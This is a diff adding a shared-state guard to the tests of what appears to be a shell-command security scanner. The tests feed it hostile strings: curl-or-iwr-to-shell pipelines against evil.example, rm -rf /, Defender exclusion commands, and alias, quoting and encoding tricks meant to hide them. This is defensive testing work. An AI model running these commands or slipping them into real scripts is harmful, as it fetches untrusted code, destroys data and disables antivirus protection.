@@ -14313,6 +14313,7 @@ mod tests {
 
     #[test]
     fn test_extract_urls_basic() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("curl https://example.com/install.sh", ShellType::Posix);
         assert_eq!(urls.len(), 1);
         assert_eq!(urls[0].raw, "https://example.com/install.sh");
@@ -14320,6 +14321,7 @@ mod tests {
 
     #[test]
     fn test_extract_urls_from_leading_env_assignment() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "PAYLOAD_URL=https://example.com/install.sh curl ok",
             ShellType::Posix,
@@ -14333,6 +14335,7 @@ mod tests {
 
     #[test]
     fn test_extract_urls_from_quoted_leading_env_assignment() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "PAYLOAD_URL='https://example.com/install.sh' curl ok",
             ShellType::Posix,
@@ -14346,6 +14349,7 @@ mod tests {
 
     #[test]
     fn test_proxy_env_assignment_url_is_not_treated_as_destination() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "HTTP_PROXY=http://proxy:8080 curl https://example.com/data",
             ShellType::Posix,
@@ -14358,6 +14362,7 @@ mod tests {
 
     #[test]
     fn test_extract_urls_pipe() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "curl https://example.com/install.sh | bash",
             ShellType::Posix,
@@ -14368,6 +14373,7 @@ mod tests {
 
     #[test]
     fn test_extract_urls_scp() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("git clone git@github.com:user/repo.git", ShellType::Posix);
         assert!(!urls.is_empty());
         assert!(matches!(urls[0].parsed, UrlLike::Scp { .. }));
@@ -14375,6 +14381,7 @@ mod tests {
 
     #[test]
     fn test_extract_docker_ref() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("docker pull nginx", ShellType::Posix);
         let docker_urls: Vec<_> = urls
             .iter()
@@ -14385,6 +14392,7 @@ mod tests {
 
     #[test]
     fn test_extract_powershell_iwr() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "iwr https://example.com/script.ps1 | iex",
             ShellType::PowerShell,
@@ -14394,6 +14402,7 @@ mod tests {
 
     #[test]
     fn test_wrapper_preserves_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "env --ignore-environment curl http://example.com",
             ShellType::Posix,
@@ -14407,6 +14416,7 @@ mod tests {
 
     #[test]
     fn test_env_wrapper_preserves_tirith_run_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("env tirith run http://example.com", ShellType::Posix);
         assert!(
             urls.iter()
@@ -14417,6 +14427,7 @@ mod tests {
 
     #[test]
     fn test_command_wrapper_preserves_tirith_run_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("command tirith run http://example.com", ShellType::Posix);
         assert!(
             urls.iter()
@@ -14427,6 +14438,7 @@ mod tests {
 
     #[test]
     fn test_time_wrapper_preserves_tirith_run_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("time tirith run http://example.com", ShellType::Posix);
         assert!(
             urls.iter()
@@ -14512,6 +14524,7 @@ mod tests {
 
     #[test]
     fn test_segment_index_correct() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("curl https://a.com | wget https://b.com", ShellType::Posix);
         // Each URL should have the segment index of the segment it came from
         for url in &urls {
@@ -14522,6 +14535,7 @@ mod tests {
 
     #[test]
     fn test_docker_build_context_not_image() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("docker build .", ShellType::Posix);
         let docker_urls: Vec<_> = urls
             .iter()
@@ -14536,6 +14550,7 @@ mod tests {
 
     #[test]
     fn test_docker_image_subcmd() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("docker image pull nginx", ShellType::Posix);
         let docker_urls: Vec<_> = urls
             .iter()
@@ -14546,6 +14561,7 @@ mod tests {
 
     #[test]
     fn test_docker_run_image_after_double_dash() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(
             "docker run --rm -- evil.registry/ns/img:1",
             ShellType::Posix,
@@ -14633,6 +14649,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_skip_curl_output_flag() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // `-o <filename>` is curl's output flag; the filename must not be
         // treated as a schemeless URL even though it matches the host shape.
         let urls = extract_urls("curl -o lenna.png https://example.com", ShellType::Posix);
@@ -14648,6 +14665,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_skip_curl_output_combined() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("curl -olenna.png https://example.com", ShellType::Posix);
         let schemeless: Vec<_> = urls
             .iter()
@@ -14661,6 +14679,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_skip_wget_output_flag() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("wget -O output.html https://example.com", ShellType::Posix);
         let schemeless: Vec<_> = urls
             .iter()
@@ -14674,6 +14693,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_skip_wget_combined() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("wget -Ooutput.html https://example.com", ShellType::Posix);
         let schemeless: Vec<_> = urls
             .iter()
@@ -14687,6 +14707,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_real_domain_still_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("curl evil.com/payload", ShellType::Posix);
         let schemeless: Vec<_> = urls
             .iter()
@@ -14700,6 +14721,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_user_at_host_detected_in_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("curl user@bit.ly", ShellType::Posix);
         let schemeless: Vec<_> = urls
             .iter()
@@ -14711,6 +14733,7 @@ mod tests {
 
     #[test]
     fn test_scp_user_at_host_not_treated_as_schemeless_url() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls("scp user@server.com file.txt", ShellType::Posix);
         let schemeless: Vec<_> = urls
             .iter()
@@ -14727,6 +14750,7 @@ mod tests {
 
     #[test]
     fn test_scp_plain_host_path_not_schemeless() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // The reporter's exact command shape.
         assert!(!scp_has_schemeless(
             "scp test.asdf testhost:/home/user/",
@@ -14736,6 +14760,7 @@ mod tests {
 
     #[test]
     fn test_scp_plain_host_relative_path_not_schemeless() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         assert!(!scp_has_schemeless(
             "scp file.txt host:dir/",
             ShellType::Posix
@@ -14744,6 +14769,7 @@ mod tests {
 
     #[test]
     fn test_rsync_plain_host_path_not_schemeless() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         assert!(!scp_has_schemeless(
             "rsync -av src host:/dest/",
             ShellType::Posix
@@ -14752,6 +14778,7 @@ mod tests {
 
     #[test]
     fn test_scp_one_letter_alias_posix_accepted() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // `x:/tmp/` on POSIX is a legitimate single-letter SSH alias.
         // The drive-letter guard must NOT reject this.
         assert!(!scp_has_schemeless("scp file x:/tmp/", ShellType::Posix));
@@ -14872,6 +14899,7 @@ mod tests {
 
     #[test]
     fn test_schemeless_tld_overlap_sink_context_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // In a real sink context, evil.zip/payload should be detected as schemeless URL.
         let urls = extract_urls("curl evil.zip/payload", ShellType::Posix);
         let schemeless: Vec<_> = urls
@@ -14886,6 +14914,7 @@ mod tests {
 
     #[test]
     fn shell_effective_spelling_reaches_tier3_and_sink_resolution() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"c"ur"l EVIL.EXAMPLE:8443/payload"#;
         assert!(tier1_scan_for_shell(
             input,
@@ -14902,6 +14931,7 @@ mod tests {
 
     #[test]
     fn full_url_schemes_are_case_insensitive_after_shell_normalization() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let urls = extract_urls(r#"curl HT"TP://EVIL.EXAMPLE"/payload"#, ShellType::Posix);
         assert!(urls.iter().any(|url| {
             url.parsed.scheme() == Some("http") && url.parsed.host() == Some("evil.example")
@@ -14910,6 +14940,7 @@ mod tests {
 
     #[test]
     fn schemeless_structural_parser_covers_ports_ips_queries_and_fragments() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (destination, expected_host) in [
             ("evil.example:8443/a", "evil.example"),
             ("127.0.0.1:8080/a", "127.0.0.1"),
@@ -14933,6 +14964,7 @@ mod tests {
 
     #[test]
     fn schemeless_structural_parser_keeps_file_controls() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         assert!(extract_urls("curl README.md", ShellType::Posix).is_empty());
         assert!(
             extract_urls("curl -o archive.zip example.com", ShellType::Posix)
@@ -14964,6 +14996,7 @@ mod tests {
 
     #[test]
     fn package_registry_specs_are_not_schemeless_urls_but_artifact_urls_remain_visible() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "npm install eslint.config@^1",
             "npm i @scope/eslint.config@latest",
@@ -15032,6 +15065,7 @@ mod tests {
 
     #[test]
     fn docker_pull_value_and_unknown_options_cannot_hide_the_real_image() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let known = extract_urls(
             "docker run --pull always attacker.example/ns/image:1",
             ShellType::Posix,
@@ -15079,6 +15113,7 @@ mod tests {
 
     #[test]
     fn inspection_carveout_only_skips_proven_literal_arguments() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let literal = r#"tirith diff '$(curl https://literal.example)'"#;
         assert!(tirith_inert_arg_range(literal, ShellType::Posix).is_some());
         assert!(extract_urls(literal, ShellType::Posix).is_empty());
@@ -15103,6 +15138,7 @@ mod tests {
 
     #[test]
     fn nested_substitutions_keep_single_quotes_literal_inside_double_quotes() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"tirith diff "it's $(curl https://quote-state.example/payload)""#;
         for shell in [ShellType::Posix, ShellType::PowerShell] {
             let bodies = executable_substitutions(input, shell);
@@ -15121,6 +15157,7 @@ mod tests {
 
     #[test]
     fn executable_body_preflight_ignores_quoted_data_but_caps_real_substitutions() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let delimiter_data = ";;&|(){}<>`".repeat(128);
         for (input, shell) in [
             (format!("rg '{delimiter_data}' README.md"), ShellType::Posix),
@@ -15174,6 +15211,7 @@ mod tests {
 
     #[test]
     fn substitution_close_ignores_commented_parens_and_resumes_after_newline() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for shell in [ShellType::Posix, ShellType::PowerShell] {
             let input =
                 "tirith diff \"$(echo safe # )\ncurl https://comment-close.example/payload)\"";
@@ -15198,6 +15236,7 @@ mod tests {
 
     #[test]
     fn powershell_only_recovers_scriptblocks_in_executable_contexts() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$block = { Add-MpPreference -ExclusionPath C:\\Temp }",
             "Write-Output '{ Add-MpPreference -ExclusionPath C:\\Temp }'",
@@ -15228,6 +15267,7 @@ mod tests {
 
     #[test]
     fn powershell_nested_groups_and_subexpressions_are_recovered_one_level_at_a_time() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let outer = executable_substitution_scan(
             "& { Write-Output $(& { Add-MpPreference -ExclusionPath C:\\Temp }) }",
             ShellType::PowerShell,
@@ -15246,6 +15286,7 @@ mod tests {
 
     #[test]
     fn powershell_dynamic_or_incomplete_invocation_retains_a_gap() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in ["& $block", "& foo$bar", "& \"foo$bar\""] {
             let dynamic = executable_substitution_scan(input, ShellType::PowerShell);
             assert_eq!(
@@ -15268,6 +15309,7 @@ mod tests {
 
     #[test]
     fn literal_shell_wrapper_bodies_preserve_the_child_shell() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, outer_shell, child_shell, expected) in [
             (
                 "sh -c 'npm install known-bad'",
@@ -15319,6 +15361,7 @@ mod tests {
 
     #[test]
     fn encoded_powershell_wrapper_body_is_decoded_as_utf16le() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use base64::Engine as _;
 
         let source = "Add-MpPreference -ExclusionPath C:\\Temp";
@@ -15344,6 +15387,7 @@ mod tests {
 
     #[test]
     fn unicode_parameter_dashes_bind_cross_shell_powershell_command_bodies() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let source = "Add-MpPreference -ExclusionPath C:\\Temp";
         for dash in ['\u{2013}', '\u{2014}', '\u{2015}'] {
             let input = format!("pwsh {dash}Command '{source}'");
@@ -15366,6 +15410,7 @@ mod tests {
 
     #[test]
     fn dynamic_or_invalid_shell_wrapper_bodies_retain_a_gap() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, shell, expected) in [
             (
                 r#"sh -c "$COMMAND""#,
@@ -15410,6 +15455,7 @@ mod tests {
 
     #[test]
     fn executable_scan_input_budget_is_exact_and_preserves_prefix_bodies() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let exact = "x".repeat(MAX_EXECUTABLE_SCAN_INPUT_BYTES);
         let exact_scan = executable_substitution_scan(&exact, ShellType::Posix);
         assert!(
@@ -15442,6 +15488,7 @@ mod tests {
 
     #[test]
     fn executable_scan_candidate_budget_is_exact_and_fails_closed_at_plus_one() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let exact = "true;".repeat(MAX_EXECUTABLE_SCAN_CANDIDATES);
         let exact_scan = executable_substitution_scan(&exact, ShellType::Posix);
         assert!(
@@ -15460,6 +15507,7 @@ mod tests {
 
     #[test]
     fn executable_scan_body_budget_keeps_the_exact_prefix_and_marks_omission() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let body_input = |count: usize| {
             let mut input = String::from("echo ");
             for spaces in 1..=count {
@@ -15494,6 +15542,7 @@ mod tests {
 
     #[test]
     fn derived_or_unparsed_posix_command_bodies_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$(printf rm) -rf /",
             "${UNSET:-rm} -rf /",
@@ -15512,6 +15561,7 @@ mod tests {
 
     #[test]
     fn bounded_heredocs_preserve_literal_data_and_recover_executable_input() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let arithmetic = executable_substitution_scan("echo $((1 << 2))", ShellType::Posix);
         assert!(arithmetic.gap.is_none(), "{arithmetic:?}");
 
@@ -15579,6 +15629,7 @@ mod tests {
 
     #[test]
     fn secondary_command_consumers_recover_their_literal_child() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, shell, child_shell, expected) in [
             (
                 "printf x | xargs rm -rf /",
@@ -15683,6 +15734,7 @@ mod tests {
 
     #[test]
     fn find_action_spellings_used_as_predicate_operands_are_not_executed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "find . -name -exec -print",
             "find . -path -execdir -print",
@@ -15697,6 +15749,7 @@ mod tests {
 
     #[test]
     fn dynamic_secondary_command_consumers_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, shell) in [
             ("xargs -I{} {} -rf /", ShellType::Posix),
             ("find . -exec $COMMAND {} \\;", ShellType::Posix),
@@ -15713,6 +15766,7 @@ mod tests {
 
     #[test]
     fn powershell_functions_and_switch_actions_are_executable_bodies() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
             "filter Evil { Add-MpPreference -ExclusionPath C:\\Temp }; Evil",
@@ -15743,6 +15797,7 @@ mod tests {
 
     #[test]
     fn powershell_invoked_function_named_blocks_are_recovered_only_in_function_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (keyword, invocation) in [
             ("dynamicparam", "Evil"),
             ("begin", "Evil"),
@@ -15782,6 +15837,7 @@ mod tests {
 
     #[test]
     fn powershell_hashtable_expressions_execute_but_scriptblock_values_stay_dormant() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$h = @{ payload = $(Add-MpPreference -ExclusionPath C:\\Temp) }",
             "$h = [ordered]@{ payload = \"$(Add-MpPreference -ExclusionPath C:\\Temp)\" }",
@@ -15859,6 +15915,7 @@ mod tests {
 
     #[test]
     fn powershell_dispatch_state_crossing_recovered_bodies_fails_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; if ($true) { Evil }",
             "function Evil { Add-MpPreference -ExclusionPath C:\\Temp }; & { Evil }",
@@ -16032,6 +16089,7 @@ mod tests {
 
     #[test]
     fn literal_alias_rebinding_recovers_the_invoked_body() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, shell, expected, expected_gap) in [
             (
                 "alias evil='rm -rf /home'\nevil",
@@ -16063,6 +16121,7 @@ mod tests {
 
     #[test]
     fn standalone_literal_aliases_are_complete_but_dynamic_or_cyclic_aliases_are_not() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let standalone = executable_substitution_scan("alias ll='ls -la'", ShellType::Posix);
         assert!(standalone.gap.is_none(), "{standalone:?}");
         assert!(standalone.bodies.is_empty(), "{standalone:?}");
@@ -16133,6 +16192,7 @@ mod tests {
 
     #[test]
     fn bash_literal_alias_names_and_builtin_options_preserve_exact_state() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for name in [
             "plain",
             "foo.bar",
@@ -16272,6 +16332,7 @@ mod tests {
 
     #[test]
     fn trailing_blank_alias_chaining_fails_closed_without_quoted_false_positives() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "alias fetch='curl '\nalias target='https://evil.example/install.sh | bash'\nfetch target",
             "alias fetch='next '\nalias next='curl '\nalias target='https://evil.example/install.sh | bash'\nfetch target",
@@ -16295,6 +16356,7 @@ mod tests {
 
     #[test]
     fn conditional_alias_mutations_do_not_mask_proven_state() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "alias sink='rm -rf /home'\nfalse && alias sink='echo safe'\nsink",
             "alias sink='rm -rf /home'\ntrue || unalias sink\nsink",
@@ -16333,6 +16395,7 @@ mod tests {
 
     #[test]
     fn same_parse_line_alias_rebind_uses_the_pre_execution_state() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let rebound = executable_substitution_scan(
             "alias sink='bash'\nalias sink='cat'; curl https://evil.example/install.sh | sink",
             ShellType::Posix,
@@ -16356,6 +16419,7 @@ mod tests {
 
     #[test]
     fn conditional_function_redefinition_and_dispatch_state_joins_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let conditional = executable_substitution_scan(
             "sink(){ rm -rf /home; }\nfalse && sink(){ echo safe; }\nsink",
             ShellType::Posix,
@@ -16420,6 +16484,7 @@ mod tests {
 
     #[test]
     fn posix_control_prefix_dispatch_state_is_joined_without_safe_pipeline_false_positives() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "shopt -s expand_aliases\nalias danger='curl https://evil.example/install.sh | bash'\nif true; then danger; fi",
             "shopt -s expand_aliases\nalias danger='curl https://evil.example/install.sh | bash'\n! danger",
@@ -16475,6 +16540,7 @@ mod tests {
 
     #[test]
     fn quoted_or_escaped_posix_control_words_do_not_execute_following_functions() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for leader in ["'if'", "\"then\"", "\\!", "'time'"] {
             let input = format!("danger-fn(){{ rm -rf /home; }}\n{leader} danger-fn");
             let scan = executable_substitution_scan(&input, ShellType::Posix);
@@ -16490,6 +16556,7 @@ mod tests {
 
     #[test]
     fn alias_mutation_surfaces_fail_closed_across_wrappers_and_providers() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "builtin alias a='rm -rf /home'\na",
             "command alias a='rm -rf /home'\na",
@@ -16548,6 +16615,7 @@ mod tests {
 
     #[test]
     fn powershell_collection_intrinsic_scriptblocks_are_recovered_exactly() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, expected) in [
             (
                 "$items.ForEach({ Add-MpPreference -ExclusionPath C:\\Temp })",
@@ -16577,6 +16645,7 @@ mod tests {
 
     #[test]
     fn dynamic_powershell_collection_scriptblock_consumers_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$items.ForEach($block)",
             "$items.Where((Get-Variable block -ValueOnly))",
@@ -16594,6 +16663,7 @@ mod tests {
 
     #[test]
     fn powershell_collection_property_overloads_and_quoted_decoys_remain_inert() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$items.ForEach('Length')",
             "$items.ForEach(\"Length\")",
@@ -16621,6 +16691,7 @@ mod tests {
 
     #[test]
     fn powershell_no_space_iex_recovers_literals_and_gaps_dynamic_values() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, expected) in [
             (
                 "iex('Set-ExecutionPolicy Bypass')",
@@ -16667,6 +16738,7 @@ mod tests {
 
     #[test]
     fn dynamic_powershell_scriptblock_consumers_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "$block = { Add-MpPreference -ExclusionPath C:\\Temp }; $block.Invoke()",
             "$block.InvokeWithContext($null, @(), @())",
@@ -16688,6 +16760,7 @@ mod tests {
 
     #[test]
     fn powershell_scriptblock_invoke_methods_accept_unicode_whitespace() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "{ Add-MpPreference -ExclusionPath C:\\Temp }\u{00a0}.Invoke\u{2003}()",
             "{ Add-MpPreference -ExclusionPath C:\\Temp }\u{202f}.InvokeReturnAsIs\u{205f}()",
@@ -16718,6 +16791,7 @@ mod tests {
 
     #[test]
     fn powershell_parameter_prefixes_bind_scriptblocks_and_scopes() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let scope = |command: &str, args: &[&str]| {
             powershell_scriptblock_scope(
                 command,
@@ -16857,6 +16931,7 @@ mod tests {
 
     #[test]
     fn powershell_dispatch_boundary_regressions_cover_strings_paths_locations_and_scopes() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "'Set-Alias Evil Invoke-Expression'",
             "\"pwsh\" -Command 'Add-MpPreference -ExclusionPath C:\\Temp'",
@@ -16921,6 +16996,7 @@ mod tests {
 
     #[test]
     fn powershell_here_strings_preserve_literal_data_and_recover_expansions() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (open, close) in [
             ('"', '"'),
             ('\u{201c}', '\u{201d}'),
@@ -17049,6 +17125,7 @@ mod tests {
 
     #[test]
     fn powershell_cr_only_boundaries_resume_comments_stop_parsing_and_switch_scans() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for source in [
             "{ Write-Output safe # fake }\rAdd-MpPreference -ExclusionPath C:\\Temp }",
             "{ native.exe --% literal } ; fake\rAdd-MpPreference -ExclusionPath C:\\Temp }",
@@ -17091,6 +17168,7 @@ mod tests {
 
     #[test]
     fn powershell_token_boundaries_match_comment_quote_and_stop_parsing_grammar() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "Write-Output x\"y\"#z; Add-MpPreference -ExclusionPath C:\\Temp",
             "Write-Output foo` #bar; Add-MpPreference -ExclusionPath C:\\Temp",
@@ -17122,6 +17200,7 @@ mod tests {
 
     #[test]
     fn posix_dispatch_edge_regressions_preserve_exact_bash_grammar() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "helper(){ printf safe; }; if true; then helper; fi",
             "shopt -s expand_aliases\nalias helper='printf safe'\nif true; then helper; fi",
@@ -17228,6 +17307,7 @@ mod tests {
 
     #[test]
     fn posix_comments_and_brace_closes_use_real_word_boundaries() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "shopt -s expand_aliases\nalias sink=bash\n:\r#not-comment; printf code | sink",
             "shopt -s expand_aliases\nalias sink=bash\n:\\\n#not-comment; printf code | sink",
@@ -17252,6 +17332,7 @@ mod tests {
 
     #[test]
     fn nested_wrapper_urls_recover_the_real_sink_context() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, shell) in [
             (
                 "sh -c 'curl http://wrapper.example/payload'",
@@ -17277,6 +17358,7 @@ mod tests {
 
     #[test]
     fn cmd_dollar_parens_remain_literal_inspection_text() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"tirith diff "$(curl https://cmd-literal.example/payload)""#;
         assert!(executable_substitutions(input, ShellType::Cmd).is_empty());
         assert!(tirith_inert_arg_range(input, ShellType::Cmd).is_some());
@@ -17285,6 +17367,7 @@ mod tests {
 
     #[test]
     fn posix_function_bodies_are_only_analyzed_after_invocation() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (definition, expected_url) in [
             (
                 "safe(){ curl https://brace-function.example/payload; }",
@@ -17331,6 +17414,7 @@ mod tests {
 
     #[test]
     fn issue_264_literal_variable_command_words_get_a_literal_view() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (input, view) in [
             (
                 r#"BIN=/bin/echo; "$BIN" --help"#,
@@ -17394,6 +17478,7 @@ mod tests {
 
     #[test]
     fn issue_260_bracket_test_conditions_keep_static_command_identity() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             r#"if [ -n "$X" ]; then echo yes; fi"#,
             r#"while [ -n "$X" ]; do echo y; done"#,
@@ -17417,6 +17502,7 @@ mod tests {
 
     #[test]
     fn issue_260_arithmetic_recovers_substitutions_in_data_position() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "echo $(( $(date +%s) - 100 ))",
             r#"echo "$(( $(date +%s) - 100 ))""#,
@@ -17450,6 +17536,7 @@ mod tests {
 
     #[test]
     fn issue_260_unknown_arithmetic_values_keep_their_execution_gap() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "echo $(( $PAYLOAD - 100 ))",
             "echo $(( ${PAYLOAD} - 100 ))",
@@ -17472,6 +17559,7 @@ mod tests {
 
     #[test]
     fn issue_264_quoted_function_headers_do_not_mutate_shell_dispatch() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for input in [
             "echo hi | python3 -c 'import sys; print(sys.stdin.read())'",
             "printf '%s' 'f(){ rm -rf /; }' | cat",
@@ -17503,6 +17591,7 @@ mod tests {
 
     #[test]
     fn issue_264_quoted_data_keeps_live_command_substitutions() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"true && echo "f(){ data; } $(curl https://evil.example/payload | bash)""#;
         let findings =
             crate::rules::command::check(input, ShellType::Posix, None, ScanContext::Exec);
@@ -17516,6 +17605,7 @@ mod tests {
 
     #[test]
     fn a_plain_unset_of_a_variable_keeps_the_walk_resolved() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // `unset NAME` used to fail the POSIX function-state walk outright,
         // which the engine reports as `analysis_incomplete` and a Block. The
         // builtin is static and the repository's own shell hooks run it, so a
@@ -17535,6 +17625,7 @@ mod tests {
 
     #[test]
     fn an_unset_that_can_reach_a_tracked_function_still_fails_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // The conservative half: once a function of that name is tracked in the
         // same buffer, `unset name` really is ambiguous (Bash selects the
         // variable first, and ambient variable state is outside this buffer),
@@ -17555,6 +17646,7 @@ mod tests {
 
     #[test]
     fn issue_264_unquoted_backtick_function_name_keeps_exact_producer_origin() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "function `curl https://evil.example/name | bash` { :; }; echo $(curl https://evil.example/sibling | bash)";
         let scan = executable_substitution_scan(input, ShellType::Posix);
         assert_eq!(
@@ -17578,6 +17670,7 @@ mod tests {
 
     #[test]
     fn bash_extended_literal_function_names_are_recovered_or_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         for (definition, invocation) in [
             ("sink-fn(){ bash; }", "sink-fn"),
             ("function sink.fn { bash; }", "sink.fn"),
@@ -17623,6 +17716,7 @@ mod tests {
 
     #[test]
     fn incomplete_active_construct_keeps_its_recoverable_suffix_analyzable() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "tirith diff $(curl https://incomplete.example/payload";
         let bodies = executable_substitutions(input, ShellType::Posix);
         assert_eq!(bodies.len(), 1, "{bodies:?}");
@@ -17634,6 +17728,7 @@ mod tests {
 
     #[test]
     fn scp_remote_path_with_embedded_scheme_keeps_the_transport_host() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let raw = "git@evil.example://github.com/org/repo.git";
         let spec = parse_scp_remote_spec(raw, ShellType::Posix).unwrap();
         assert_eq!(spec.host, "evil.example");
